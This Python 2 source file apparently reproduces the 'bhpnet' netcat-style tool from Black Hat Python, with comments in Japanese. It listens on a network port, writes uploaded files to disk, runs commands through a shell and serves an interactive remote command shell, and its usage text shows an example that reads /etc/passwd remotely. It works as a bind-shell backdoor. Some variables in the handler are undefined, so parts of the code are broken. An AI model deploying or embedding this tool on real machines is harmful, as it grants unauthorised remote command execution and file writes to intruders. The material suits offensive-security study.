# -*- coding: utf-8 -*-
import sys
import socket
import getopt
import argparse
import threading
import subprocess


def client_sender(args, buf):
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        client.connect((args.target, args.port))
        if len(buf):
            client.send(buf)
        while True:
            recv_len = 1
            response = ""

            while recv_len:
                data = client.recv(4096)
                recv_len = len(data)
                response += data

                if recv_len < 4096:
                    break
            print(response)

            buf = raw_input("")
            buf += "\n"
            client.send(buf)
    except Exception as e:
        print(e)
        client.close()


def server_loop(args):
    target, port = args.target, args.port
    # 待機するIPアドレスが指定されていない場合は，全てのインターフェースで接続を待機
    if not len(target):
        target = '0.0.0.0'

    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((target, port))
    server.listen(5)

    while True:
        client_socket, addr = server.accept()
        client_thread = threading.Thread(
            target=client_handler, args=(args, client_socket,))
        client_thread.start()


def run_command(command):
    command = command.rstrip()

    try:
        output = subprocess.check_output(
            command, stderr=subprocess.STDOUT, shell=True)
    except Exception as e:
        print(e)
        output = "Failed to execute command.\r\n"

    return output


def client_handler(args, client_socket):
    if len(args.upload_destination):
        file_buffer = ""
        while True:
            data = client_socket.recv(1024)
            if len(data) == 0:
                break
            else:
                file_buffer += data
        try:
            file_descripter = open(args.upload_destination, 'wb')
            file_descripter.write(file_buffer)
            file_descripter.close()
            client_socket.send(
                "Success")
        except:
            client_socket.send(
                "Failed to save file to %s\r\n" % upload_destination)
    if len(args.execute):
        output = run_command(execute)
        client_socket.send(output)

    if args.command:
        prompt = "<BHP:#>"
        client_socket.send(prompt)

        while True:
            cmd_buffer = ""
            while "\n" not in cmd_buffer:
                cmd_buffer += client_socket.recv(1024)
            response = run_command(cmd_buffer)
            response += prompt
            client_socket.send(response)


def parse_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument("-l", "--listen", help="listen on [host] : [port]"
                        " for incoming connection",
                        default=False, action='store_true')
    parser.add_argument("-e", "--execute", help="execute the given file upon"
                        "receiving a connection",
                        type=str, default="")
    parser.add_argument("-c", "--command", help="initialize command shell",
                        default=False, action='store_true')
    parser.add_argument("-u", "--upload-destination",
                        help="upon receiving connection upload a"
                        "a file and write to [destination]",
                        type=str, default="")
    parser.add_argument(
        '-p', '--port', help="specify port number", type=int, default=9999)
    parser.add_argument("-t", "--target", type=str, default="")
    return parser.parse_args()


def show_usage(e=None):
    print(e)
    print("----example----")
    print("bhpnet.py -t 192.168.0.1 -p 5555 -l -c")
    print("bhpnet.py -t 192.168.0.1 -p 5555 -l -u c:\\target.exe")
    print("bhpnet.py -t 192.168.0.1 -p 5555 -l -e \"cat /etc/passwd\"")
    print("echo 'ABCDEFGHI' | ./bhpnet.py -t 192.168.11.12 -p 135")


def main():
    try:
        args = parse_arguments()
    except Exception as e:
        show_usage(e)
        sys.exit(0)
    if not args.listen and len(args.target) and args.port > 0:
        """
        insert message into 'buffer' from standard input
        press ctrl-D to ignore standard input
        """
        buf = sys.stdin.read()
        client_sender(args, buf)
    if args.listen:
        server_loop(args)
    else:
        show_usage()

if __name__ == '__main__':
    main()
